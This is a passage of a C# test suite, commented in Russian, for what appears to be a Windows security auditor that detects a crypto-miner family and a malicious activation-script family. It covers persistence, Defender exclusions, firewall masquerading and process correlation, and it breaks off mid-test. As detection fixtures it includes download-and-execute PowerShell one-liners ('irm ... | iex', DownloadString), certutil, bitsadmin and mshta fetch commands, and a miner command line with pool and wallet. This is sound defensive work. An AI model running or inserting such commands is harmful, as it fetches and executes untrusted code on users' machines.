using Sentinel.Core.Audit;
using Sentinel.Core.Audit.Config;
using Sentinel.Core.Audit.Persistence;
using Sentinel.Core.Audit.Persistence.Registry;
using Sentinel.Core.Audit.Persistence.Tasks;
using Sentinel.Core.Audit.Process;
using Sentinel.Core.Remediation;
using Sentinel.Core.Scanning;
using Sentinel.Core.Signatures;
using Sentinel.Core.Testing;
using Sentinel.Core.ThreatFamilies;
using Sentinel.Core.Trust;

namespace Sentinel.Core.Tests;

// Все данные синтетические: имена, хеши и адреса из IOC семейств CAAService/techias, без живых образцов.

internal sealed class FakeFirewallEditor : IFirewallRuleEditor
{
    public Dictionary<string, string> Rules { get; } = new(StringComparer.OrdinalIgnoreCase);

    public Dictionary<string, IReadOnlyList<string>> BlockRules { get; } = new(StringComparer.OrdinalIgnoreCase);

    public ProviderResult RemoveRule(string ruleId)
    {
        if (Rules.Remove(ruleId) || BlockRules.Remove(ruleId))
        {
            return ProviderResult.Ok;
        }

        return ProviderResult.Fail("Правило не найдено.");
    }

    public ProviderResult RestoreRule(string ruleId, string rawValue)
    {
        Rules[ruleId] = rawValue;
        return ProviderResult.Ok;
    }

    public ProviderResult AddOutboundBlockRule(string ruleId, IReadOnlyList<string> remoteAddresses)
    {
        BlockRules[ruleId] = remoteAddresses;
        return ProviderResult.Ok;
    }
}

internal sealed class FakeConnections(params NetworkConnection[] connections) : INetworkConnectionProvider
{
    public IReadOnlyList<NetworkConnection> GetConnections() => connections;
}

internal static class FamilyFixtures
{
    public const string RunKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
    public const string MsSubject = "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US";

    public const string MinerCommandLine =
        "\"C:\\ProgramData\\CAAService\\Microsoft Network Realtime lnspection Service.exe\" --algorithm-gpu pearlhash "
        + "--pool prl-ru.kryptex.network:7048,155.212.215.227:7048 --wallet prl1p5hgdn92f0h2zt0qaemc6f8zdx5u28fvkpmvzhaehm6xwqgtez7dsqert43.H6";

    public static FileAnalyzer Analyzer(ISignatureVerifier verifier) =>
        new(new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory)), verifier);

    public static string TaskXml(string command, string arguments, string userId = "S-1-5-18", bool logon = true) => $"""
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo><Date>2026-11-14T11:20:00</Date><URI>\Microsoft\Office\Office Persistent Activation</URI></RegistrationInfo>
          <Triggers>{(logon ? "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>" : "<CalendarTrigger><StartBoundary>2026-01-01T03:00:00</StartBoundary></CalendarTrigger>")}</Triggers>
          <Principals><Principal id="Author"><UserId>{userId}</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
          <Settings><Enabled>true</Enabled></Settings>
          <Actions Context="Author"><Exec><Command>{command}</Command><Arguments>{System.Security.SecurityElement.Escape(arguments)}</Arguments></Exec></Actions>
        </Task>
        """;
}

// ---- Правила, каталог IOC, имена ----------------------------------------------------

public class ThreatFamilyRuleTests
{
    [Fact]
    public void FamilyRules_LoadWithoutErrors_AndCarryAllHashes()
    {
        var set = RuleLoader.LoadDirectory(RepoPaths.RulesDirectory);
        Assert.Empty(set.Errors);
        var caa = Assert.Single(set.Rules, r => r.Id == "SNT-FAM-CAA-0001");
        Assert.Equal(4, caa.Sha256.Count);
        Assert.Single(set.Rules, r => r.Id == "SNT-FAM-TECHIAS-0001");
        foreach (var family in ThreatFamilyCatalog.All)
        {
            foreach (var hash in family.Hashes.Keys)
            {
                Assert.Contains(set.Rules, r => r.Sha256.Contains(hash));
            }
        }
    }

    [Fact]
    public void PearlhashConfigRule_MatchesSyntheticConfig_NotPlainText()
    {
        using var tmp = new TempDir();
        var config = tmp.WriteText("CAAServices.cfg", "--algorithm-gpu pearlhash --pool prl-ru.kryptex.network:7048");
        var clean = tmp.WriteText("notes.txt", "pearl necklace and a kryptonite story");
        var analyzer = FamilyFixtures.Analyzer(new UnavailableSignatureVerifier());

        Assert.Contains(analyzer.Analyze(config).Detections, d => d.RuleId == "SNT-FAM-CAA-0002");
        Assert.DoesNotContain(analyzer.Analyze(clean).Detections, d => d.RuleId?.StartsWith("SNT-FAM", StringComparison.Ordinal) == true);
    }

    [Fact]
    public void TechiasUrlRule_MatchesScript()
    {
        using var tmp = new TempDir();
        var script = tmp.WriteText("activate.ps1", "irm https://activate.techias.co.uk/ | iex");
        var analyzer = FamilyFixtures.Analyzer(new UnavailableSignatureVerifier());
        Assert.Contains(analyzer.Analyze(script).Detections, d => d.RuleId == "SNT-FAM-TECHIAS-0002");
    }

    [Fact]
    public void Catalog_MatchesHashesIpsAndNames_CaseInsensitive()
    {
        Assert.Equal("CAAService", ThreatFamilyCatalog.MatchHash("BFD086E44CFE11D63271F2E5959969D435750403A340C675688219DB43B62376")!.Family.Id);
        Assert.Equal("techias", ThreatFamilyCatalog.MatchHash("613DD576FF9F6B44E958E1F7DF34123B1DED45AFF7063577AF83665D2483A32D")!.Family.Id);
        Assert.NotNull(ThreatFamilyCatalog.MatchIp("::ffff:155.212.215.227"));
        Assert.NotNull(ThreatFamilyCatalog.MatchRunValue("caa service"));
        Assert.NotNull(ThreatFamilyCatalog.MatchTaskPath(@"\Microsoft\Office\Office Persistent Activation"));
        Assert.NotNull(ThreatFamilyCatalog.MatchPath(@"C:\ProgramData\WinAIHService\WinAIHService.exe"));
        Assert.Null(ThreatFamilyCatalog.MatchHash(new string('0', 64)));
        Assert.Null(ThreatFamilyCatalog.MatchIp("8.8.8.8"));
        Assert.Null(ThreatFamilyCatalog.MatchPath(@"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe"));
    }
}

public class DeceptiveNameAnalyzerTests
{
    [Theory]
    [InlineData("Microsoft Network Realtime lnspection Service.exe", "inspection")]
    [InlineData("Micr0soft Update.exe", "microsoft")]
    [InlineData("Windows HeIper.exe", "helper")]
    [InlineData("Network Discovery (SSDP-0ut) Wind0ws", "windows")]
    public void Homoglyph_IsDetected(string name, string imitates)
    {
        var result = DeceptiveNameAnalyzer.Analyze(name);
        Assert.NotNull(result);
        Assert.Equal(DeceptiveNameKind.Homoglyph, result.Kind);
        Assert.Equal(imitates, result.Imitates);
    }

    [Fact]
    public void MixedCyrillicLatin_InOneWord_IsDetected()
    {
        var result = DeceptiveNameAnalyzer.Analyze("Wind\u043Ews Host.exe"); // кириллическая «о»
        Assert.NotNull(result);
        Assert.Equal(DeceptiveNameKind.MixedScript, result.Kind);
        Assert.Equal("windows", result.Imitates);
    }

    [Theory]
    [InlineData("Microsoft Network Realtime Inspection Service.exe")]
    [InlineData("OfficeC2RClient.exe")]
    [InlineData("OfficeTelemetryAgentLogOn2016.exe")]
    [InlineData("Telegram.exe")]
    [InlineData("AutoIt3.exe")]
    [InlineData("lsass.exe")]
    [InlineData("Network Discovery (SSDP-Out)")]
    [InlineData("Отчёт за ноябрь.docx")]
    [InlineData("WinAIHService.exe")]
    public void LegitimateNames_AreNotFlagged(string name) => Assert.Null(DeceptiveNameAnalyzer.Analyze(name));

    [Fact]
    public void ClaimsMicrosoftName_AndSignatureCheck()
    {
        Assert.True(DeceptiveNameAnalyzer.ClaimsMicrosoftName("Microsoft Network Realtime lnspection Service.exe"));
        Assert.True(DeceptiveNameAnalyzer.ClaimsMicrosoftName("Wind0ws Update.exe"));
        Assert.False(DeceptiveNameAnalyzer.ClaimsMicrosoftName("Steam.exe"));
        var ms = new SignatureVerificationResult(SignatureStatus.Valid, SignatureSource.Embedded, FamilyFixtures.MsSubject, null, null, null, 0, "ok");
        var other = ms with { SignerSubject = "CN=Some Vendor, O=Some Vendor" };
        Assert.True(DeceptiveNameAnalyzer.IsMicrosoftSigned(ms));
        Assert.False(DeceptiveNameAnalyzer.IsMicrosoftSigned(other));
        Assert.False(DeceptiveNameAnalyzer.IsMicrosoftSigned(ms with { Status = SignatureStatus.NotSigned }));
    }
}

public class MinerCommandLineTests
{
    [Fact]
    public void CaaServiceMinerCommandLine_IsCritical()
    {
        var finding = MinerCommandLineAnalyzer.Analyze(FamilyFixtures.MinerCommandLine, 42, "miner.exe");
        Assert.NotNull(finding);
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Contains(finding.Evidence, e => e.Key == "family" && e.Value == "CAAService");
    }

    [Fact]
    public void GenericStratumMiner_IsHigh()
    {
        var finding = MinerCommandLineAnalyzer.Analyze(
            "xmr.exe -a rx/0 -o stratum+tcp://pool.example.org:3333 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge -p x");
        Assert.NotNull(finding);
        Assert.Equal(Severity.High, finding.Severity);
    }

    [Theory]
    [InlineData("curl.exe -u admin:secretpassword123 -o out.txt https://example.com/file")]
    [InlineData("node server.js --pool 4 --workers 8")]
    [InlineData("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --algorithm=fast")]
    [InlineData("ffmpeg.exe -i in.mp4 -o out.mp4")]
    public void OrdinaryCommandLines_AreNotFlagged(string commandLine) => Assert.Null(MinerCommandLineAnalyzer.Analyze(commandLine));
}

// ---- PersistenceAuditor ----------------------------------------------------------------

public class FamilyPersistenceTests
{
    private const string UninstallKey = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";

    private static bool Has(PersistenceAuditReport r, string id) => r.Entries.Any(e => e.Findings.Any(f => f.Id == id));

    private static AuditFinding Finding(PersistenceAuditReport r, string id) => r.Entries.SelectMany(e => e.Findings).First(f => f.Id == id);

    [Fact]
    public void RunValue_ToUnsignedExeInProgramDataFolder_IsFlagged_WithFamily()
    {
        using var tmp = new TempDir();
        var loader = tmp.Write(Path.Combine("ProgramData", "CAAService", "CAAServices.exe"), SyntheticArtifacts.BuildPe());
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, FamilyFixtures.RunKey), "CAA Service", loader);

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), reg,
            analyzer: FamilyFixtures.Analyzer(FakeVerifier.WithStatus(SignatureStatus.NotSigned))).Audit();

        Assert.True(Has(report, "PERS-RUN-USERWRITABLE-UNSIGNED"));
        Assert.Equal(Severity.High, Finding(report, "PERS-FAMILY-IOC").Severity);
        Assert.Contains("CAAService", Finding(report, "PERS-RUN-USERWRITABLE-UNSIGNED").Description, StringComparison.Ordinal);
    }

    [Fact]
    public void RunValue_ToMicrosoftSignedExeInProgramData_IsNotFlaggedAsUnsigned()
    {
        using var tmp = new TempDir();
        var exe = tmp.Write(Path.Combine("ProgramData", "Vendor", "Microsoft Updater.exe"), SyntheticArtifacts.BuildPe());
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.CurrentUser, FamilyFixtures.RunKey), "Updater", exe);

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), reg,
            analyzer: FamilyFixtures.Analyzer(FakeVerifier.Valid(FamilyFixtures.MsSubject))).Audit();

        Assert.False(Has(report, "PERS-RUN-USERWRITABLE-UNSIGNED"));
        Assert.False(Has(report, "PERS-FAKE-MICROSOFT"));
        Assert.False(Has(report, "PERS-DECEPTIVE-NAME"));
    }

    [Fact]
    public void RunValue_UnsignedFakeMicrosoftName_IsFlagged()
    {
        using var tmp = new TempDir();
        var exe = tmp.Write(Path.Combine("ProgramData", "CAAService", "Microsoft Network Realtime lnspection Service.exe"), SyntheticArtifacts.BuildPe());
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.CurrentUser, FamilyFixtures.RunKey), "Realtime", exe);

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), reg,
            analyzer: FamilyFixtures.Analyzer(FakeVerifier.WithStatus(SignatureStatus.NotSigned))).Audit();

        Assert.Equal(Severity.High, Finding(report, "PERS-DECEPTIVE-NAME").Severity);
    }

    [Fact]
    public void PoliciesExplorerRun_AndHkcuWow_AreAudited()
    {
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"), "x", @"C:\ProgramData\X\x.exe");
        reg.Set(new RegistryKeyPath(RegistryHive.CurrentUser, @"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"), "y", @"C:\ProgramData\Y\y.exe");

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), reg).Audit();

        Assert.Contains(report.Entries, e => e.Name == "x" && e.Location.Contains("Policies", StringComparison.Ordinal));
        Assert.Contains(report.Entries, e => e.Name == "y");
    }

    [Fact]
    public void TaskXml_IrmIex_InMicrosoftFolder_AsSystemAtLogon_IsCritical()
    {
        var xml = FamilyFixtures.TaskXml(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-Command \"irm https://activate.techias.co.uk/ | iex\"");
        var task = TaskXmlParser.Parse(@"Microsoft\Office\Office Persistent Activation", @"\Microsoft\Office\Office Persistent Activation", xml);
        Assert.True(task.RunsAsSystem);
        Assert.True(task.HasLogonTrigger);

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), tasks: new FakeTaskProvider(task)).Audit();

        var finding = Finding(report, "PERS-TASK-DOWNLOAD-EXEC");
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Contains(finding.Evidence, e => e.Key == "family" && e.Value == "techias");
        Assert.Contains(finding.Evidence, e => e.Key == "urls" && e.Value.Contains("activate.techias.co.uk", StringComparison.Ordinal));
    }

    [Fact]
    public void TaskXml_GenericDownloadExec_SeverityDependsOnMasquerade()
    {
        var masquerade = TaskXmlParser.Parse("Microsoft\\Windows\\Upd", "\\Microsoft\\Windows\\Upd",
            FamilyFixtures.TaskXml("powershell.exe", "-nop -w hidden -c \"(New-Object Net.WebClient).DownloadString('http://203.0.113.5/a') | iex\""));
        var userTask = TaskXmlParser.Parse("MyTask", "\\MyTask",
            FamilyFixtures.TaskXml("powershell.exe", "-c \"iwr http://203.0.113.5/a.ps1 | iex\"", userId: "S-1-5-21-1-2-3-1001", logon: false));

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), tasks: new FakeTaskProvider(masquerade, userTask)).Audit();

        Assert.Equal(Severity.Critical, report.Entries.Single(e => e.Location == "\\Microsoft\\Windows\\Upd").Findings.First(f => f.Id == "PERS-TASK-DOWNLOAD-EXEC").Severity);
        Assert.Equal(Severity.Medium, report.Entries.Single(e => e.Location == "\\MyTask").Findings.First(f => f.Id == "PERS-TASK-DOWNLOAD-EXEC").Severity);
    }

    [Fact]
    public void GenuineOfficeTask_IsNotFlagged()
    {
        var task = TaskXmlParser.Parse(@"Microsoft\Office\Office Automatic Updates 2.0", @"\Microsoft\Office\Office Automatic Updates 2.0",
            FamilyFixtures.TaskXml(@"C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe", "/frequentupdate SCHEDULEDTASK displaylevel=False"));

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), tasks: new FakeTaskProvider(task)).Audit();

        Assert.False(Has(report, "PERS-TASK-DOWNLOAD-EXEC"));
        Assert.False(Has(report, "PERS-FAMILY-IOC"));
    }

    [Theory]
    [InlineData("-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "закодированная")]
    [InlineData("mshta.exe https://203.0.113.5/x.hta", "mshta")]
    [InlineData("certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe", "certutil")]
    [InlineData("bitsadmin /transfer j http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe", "bitsadmin")]
    [InlineData("powershell -c [Convert]::FromBase64String($x)", "FromBase64String")]
    public void DownloadExecHeuristics_RecognizeTechniques(string command, string expected) =>
        Assert.Contains(DownloadExecHeuristics.Analyze(command), h => h.Contains(expected, StringComparison.OrdinalIgnoreCase));

    [Theory]
    [InlineData("\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe\" /frequentupdate SCHEDULEDTASK")]
    [InlineData("C:\\Windows\\System32\\sc.exe start w32time task_started")]
    [InlineData("powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1")]
    public void DownloadExecHeuristics_IgnoreOrdinaryCommands(string command) => Assert.Empty(DownloadExecHeuristics.Analyze(command));

    [Fact]
    public void UninstallKey_WithImpossibleGuidLetters_IsFlagged_ValidGuidIsNot()
    {
        var reg = new InMemoryRegistryProvider();
        var forged = new RegistryKeyPath(RegistryHive.LocalMachine, UninstallKey + @"\6L903538-42B1-4596-G479-BJ779F21A65D_is1");
        reg.Set(forged, "DisplayName", "Hiddify 2.5.7").Set(forged, "InstallLocation", @"C:\Program Files\Hiddify\");
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, UninstallKey + @"\{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}_is1"), "DisplayName", "Real App");
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, UninstallKey + @"\Hiddify_is1"), "DisplayName", "AppId-style key");

        var report = new PersistenceAuditor(new PersistenceAuditorOptions(), reg).Audit();

        var entry = Assert.Single(report.Entries, e => e.Kind == PersistenceKind.UninstallEntry);
        Assert.Equal("Hiddify 2.5.7", entry.Name);
        var finding = Assert.Single(entry.Findings);
        Assert.Equal(Severity.High, finding.Severity);
        Assert.Contains("G", finding.Evidence.First(e => e.Key == "invalidChars").Value, StringComparison.Ordinal);
        Assert.Null(PersistenceAuditor.ForgedInnoSetupGuid("{0A1B2C3D-4E5F-6789-ABCD-EF0123456789}_is1"));
        Assert.Equal("L, G, J", PersistenceAuditor.ForgedInnoSetupGuid("6L903538-42B1-4596-G479-BJ779F21A65D_is1"));
    }
}

// ---- ConfigIntegrityAuditor ---------------------------------------------------------------

public class FamilyConfigTests
{
    private const string FirewallKey = @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules";

    private static ConfigFinding[] Run(InMemoryRegistryProvider reg, out ConfigAuditReport report)
    {
        report = new ConfigIntegrityAuditor(new ConfigIntegrityAuditorOptions(), reg).Audit();
        return [.. report.Findings];
    }

    [Fact]
    public void Exclusions_PowershellProcess_AndProgramDataPath_AreHigh()
    {
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"), "powershell.exe", "0", RegistryValueKind.Dword);
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"), @"C:\ProgramData\WinAIHService", "0", RegistryValueKind.Dword);
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\IpAddresses"), "95.37.216.178", "0", RegistryValueKind.Dword);

        var findings = Run(reg, out var report);

        Assert.All(findings.Where(f => f.Finding.Id == "CFG-DEFENDER-EXCL" && !f.Finding.Description.Contains("IP", StringComparison.Ordinal)),
            f => Assert.Equal(Severity.High, f.Severity));
        Assert.Equal(3, report.DefenderExclusions.Count);
        Assert.Contains(report.DefenderExclusions, x => x.Kind == DefenderExclusionKind.IpAddress && x.FromPolicy);
    }

    [Fact]
    public void Exclusion_OrdinaryToolFolder_IsMediumNotHigh()
    {
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"), @"D:\Builds", "0", RegistryValueKind.Dword);
        var finding = Assert.Single(Run(reg, out _));
        Assert.Equal(Severity.Medium, finding.Severity);
    }

    [Fact]
    public void DefenderDisablingPolicies_AreFlagged_DefaultValuesAreNot()
    {
        var reg = new InMemoryRegistryProvider();
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender"), "DisableAntiSpyware", "1", RegistryValueKind.Dword);
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"), "DisableRealtimeMonitoring", "1", RegistryValueKind.Dword);
        reg.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"), "SpynetReporting", "0", RegistryValueKind.Dword);
        var findings = Run(reg, out _).Where(f => f.Area == ConfigArea.DefenderPolicy).ToArray();
        Assert.Equal(3, findings.Length);
        Assert.All(findings, f => Assert.Equal(Severity.High, f.Severity));

        var clean = new InMemoryRegistryProvider();
        clean.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender"), "DisableAntiSpyware", "0", RegistryValueKind.Dword);
        clean.Set(new RegistryKeyPath(RegistryHive.LocalMachine, @"SOFTWARE\Microsoft\Windows Defender\Features"), "TamperProtection", "5", RegistryValueKind.Dword);
        Assert.Empty(Run(clean, out _).Where(f => f.Area == ConfigArea.DefenderPolicy));
    }

    [Fact]
    public void FirewallRule_SystemNameWithProgramDataApp_IsMasquerade()
    {
        var reg = new InMemoryRegistryProvider();
        var key = new RegistryKeyPath(RegistryHive.LocalMachine, FirewallKey);
        reg.Set(key, "{D3A1B2C4-0000-4000-8000-000000000001}",
            @"v2.31|Action=Allow|Active=TRUE|Dir=Out|App=C:\ProgramData\CAAService\CAAServices.exe|Name=Network Discovery (SSDP-Out)|");
        reg.Set(key, "{D3A1B2C4-0000-4000-8000-000000000002}",
            "v2.31|Action=Allow|Active=TRUE|Dir=In|App=C:\\ProgramData\\WinAIHService\\WinAIHService.exe|Name=Core Networking \u2013 Router Solicitation|Profile=Domain|Profile=Private|Profile=Public|");

        var findings = Run(reg, out var report).Where(f => f.Finding.Id == "CFG-FW-MASQUERADE").ToArray();

        Assert.Equal(2, findings.Length);
        Assert.All(findings, f => Assert.Equal(Severity.High, f.Severity));
        Assert.Equal(2, report.MasqueradingFirewallRules.Count);
        Assert.All(report.MasqueradingFirewallRules, r => Assert.True(r.AllProfiles));
        Assert.Contains(report.MasqueradingFirewallRules, r => r.RawValue!.Contains("SSDP-Out", StringComparison.Ordinal));
        Assert.DoesNotContain(report.Findings, f => f.Finding.Id == "CFG-FW-ALLOW");
    }

    [Fact]
    public void FirewallRule_GenuineSystemSsdpRule_IsNotFlagged()
    {
        var reg = new InMemoryRegistryProvider();
        var key = new RegistryKeyPath(RegistryHive.LocalMachine, FirewallKey);
        reg.Set(key, "NETDIS-SSDPSrv-Out-UDP",
            @"v2.31|Action=Allow|Active=TRUE|Dir=Out|Protocol=17|App=%SystemRoot%\system32\svchost.exe|Svc=Ssdpsrv|Name=@FirewallAPI.dll,-32788|EmbedCtxt=@FirewallAPI.dll,-32752|");
        reg.Set(key, "Custom-SSDP-Copy",
            @"v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=17|App=%SystemRoot%\system32\svchost.exe|Name=Network Discovery (SSDP-In)|");

        var findings = Run(reg, out var report);

        Assert.DoesNotContain(findings, f => f.Finding.Id == "CFG-FW-MASQUERADE");
        Assert.Empty(report.MasqueradingFirewallRules);
    }
}

// ---- ProcessAuditor -----------------------------------------------------------------------

public class FamilyProcessTests
{
    private static readonly DateTime T0 = new(2026, 11, 14, 8, 24, 0, DateTimeKind.Utc);

    private static ProcessSnapshot Explorer => new() { Pid = 100, ParentPid = 50, Name = "explorer.exe", ExecutablePath = @"C:\Windows\explorer.exe", StartTimeUtc = T0.AddMinutes(-5) };

    private static ProcessSnapshot Loader => new() { Pid = 200, ParentPid = 100, Name = "CAAServices.exe", ExecutablePath = @"C:\ProgramData\CAAService\CAAServices.exe", StartTimeUtc = T0 };

    private static ProcessSnapshot Miner => new()
    {
        Pid = 300, ParentPid = 200, Name = "Microsoft Network Realtime lnspection Service.exe",
        ExecutablePath = @"C:\ProgramData\CAAService\Microsoft Network Realtime lnspection Service.exe",
        CommandLine = FamilyFixtures.MinerCommandLine, StartTimeUtc = T0.AddSeconds(20),
    };

    private static ProcessAuditReport Audit(INetworkConnectionProvider? network, Func<string, DateTime?>? created = null, params ProcessSnapshot[] processes) =>
        new ProcessAuditor(new ProcessAuditorOptions { NetworkConnections = network, FileCreationTimeUtc = created ?? (_ => null) }).Audit(processes);

    private static IReadOnlyList<AuditFinding> Of(ProcessAuditReport r, int pid) => r.Entries.Single(e => e.Process.Pid == pid).Findings;

    [Fact]
    public void Miner_CommandLine_Network_AndDeceptiveName_AreFlagged()
    {
        var network = new FakeConnections(
            new NetworkConnection(300, TcpConnectionState.Established, "192.168.1.5", 50000, "155.212.215.227", 7048),
            new NetworkConnection(300, TcpConnectionState.Established, "192.168.1.5", 50001, "203.0.113.9", 3333));

        var findings = Of(Audit(network, null, Explorer, Loader, Miner), 300);

        Assert.Contains(findings, f => f.Id == MinerCommandLineAnalyzer.FindingId && f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Id == "PROC-NET-IOC" && f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Id == "PROC-NET-POOLPORT" && f.Severity == Severity.High);
        Assert.Contains(findings, f => f.Id == "PROC-DECEPTIVE-NAME");
    }

    [Fact]
    public void Loader_ListeningOnBackdoorPort_FromExplorer_IsCritical()
    {
        var network = new FakeConnections(new NetworkConnection(200, TcpConnectionState.Listen, "0.0.0.0", 24424, "0.0.0.0", 0));
        var findings = Of(Audit(network, null, Explorer, Loader), 200);
        Assert.Contains(findings, f => f.Id == "PROC-BACKDOOR-LISTEN" && f.Severity == Severity.Critical);
    }

    [Fact]
    public void Listener_OnLoopback_OrOutsideProgramData_IsNotFlagged()
    {
        var app = new ProcessSnapshot { Pid = 400, ParentPid = 100, Name = "Code.exe", ExecutablePath = @"C:\Users\u\AppData\Local\Programs\Code\Code.exe" };
        var network = new FakeConnections(
            new NetworkConnection(200, TcpConnectionState.Listen, "127.0.0.1", 24424, "0.0.0.0", 0),
            new NetworkConnection(400, TcpConnectionState.Listen, "0.0.0.0", 5000, "0.0.0.0", 0));

        var report = Audit(network, null, Explorer, Loader, app);

        Assert.DoesNotContain(Of(report, 200), f => f.Id == "PROC-BACKDOOR-LISTEN");
        Assert.DoesNotContain(Of(report, 400), f => f.Id == "PROC-BACKDOOR-LISTEN");
    }

    [Fact]
    public void ChildCreatedByLoaderAfterStart_IsDropperChild()
    {
        var findings = Of(Audit(null, path => path.EndsWith("Service.exe", StringComparison.Ordinal) ? T0.AddSeconds(10) : T0.AddDays(-3), Explorer, Loader, Miner), 300);
        Assert.Contains(findings, f => f.Id == "PROC-DROPPER-CHILD" && f.Severity == Severity.High);
    }

    [Fact]
    public void OrdinaryChildProcess_IsNotDropperChild()
    {
        var updater = new ProcessSnapshot { Pid = 500, ParentPid = 200, Name = "updater.exe", ExecutablePath = @"C:\Program Files\Vendor\updater.exe", StartTimeUtc = T0.AddSeconds(5) };
        var findings = Of(Audit(null, _ => T0.AddSeconds(1), Explorer, Loader, updater), 500);
        Assert.DoesNotContain(findings, f => f.Id == "PROC-DROPPER-CHILD");
    }
}

// ---- Корреляция ----------------------------------------------------------------------------

public class ThreatFamilyCorrelatorTests
{
    private static readonly DateTime T0 = new(2026, 11, 14, 8, 24, 0, DateTimeKind.Utc);
    private const string Folder = @"C:\ProgramData\NetSvcHelper";
    private const string Exe = Folder + @"\NetSvcHelper.exe";

    private static PersistenceEntry RunEntry(string target, DateTime? time) => new()
    {
        Kind = PersistenceKind.RegistryRun,
        Location = @"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        Name = "Net Svc Helper",
        Command = target,
        ResolvedTarget = target,
        TimestampUtc = time,
        Findings = [AuditFinding.Create("PERS-RUN-USERWRITABLE-UNSIGNED", Severity.Medium, "t", "d")],
    };

    private static ConfigAuditReport Exclusion(string path) => new([])
    {
        DefenderExclusions = [new DefenderExclusion(DefenderExclusionKind.Path, path, @"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths")],
    };

    [Fact]
    public void SingleSignal_IsMedium_NotActionable()
    {
        var detections = ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput
        {
            Persistence = new PersistenceAuditReport([RunEntry(Exe, T0)]),
        });

        var d = Assert.Single(detections);
        Assert.Equal(Severity.Medium, d.Severity);
        Assert.False(d.ChainConfirmed);
        Assert.False(d.Actionable);
    }

    [Fact]
    public void Chain_FileRunAndExclusionWithinMinutes_IsHigh()
    {
        var detections = ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput
        {
            Persistence = new PersistenceAuditReport([RunEntry(Exe, T0.AddSeconds(5))]),
            Config = Exclusion(Folder),
            DefenderEvents = [new DefenderExclusionChange(T0.AddSeconds(12), DefenderExclusionKind.Path, Folder, Added: true)],
            FileCreationTimeUtc = _ => T0,
        });

        var d = Assert.Single(detections);
        Assert.Equal(Severity.High, d.Severity);
        Assert.True(d.ChainConfirmed);
        Assert.Equal(ThreatFamilyCorrelator.ChainVerdict, d.Verdict);
        Assert.Contains(d.Signals, s => s.Contains("5007", StringComparison.Ordinal));
        Assert.Equal(Folder, Assert.Single(d.Artifacts.Folders));
        Assert.Single(d.Artifacts.Exclusions);
        Assert.Equal(Severity.High, d.ToFinding().Severity);
    }

    [Fact]
    public void Chain_SpreadOverDays_IsDowngradedToMedium()
    {
        var detections = ThreatFamilyCorrelator.Correlate(new FamilyCorrelationInput
        {
            Persistence = new PersistenceAuditReport([RunEntry(Exe, T0)]),
            Config = Exclusion(Folder),
            DefenderEvents = [new DefenderExclusionChange(T0.AddDays(3), DefenderExclusionKind.Path, Folder, Added: true)],
            FileCreationTimeUtc = _ => T0,
        });

        var d = Assert.Single(detections);
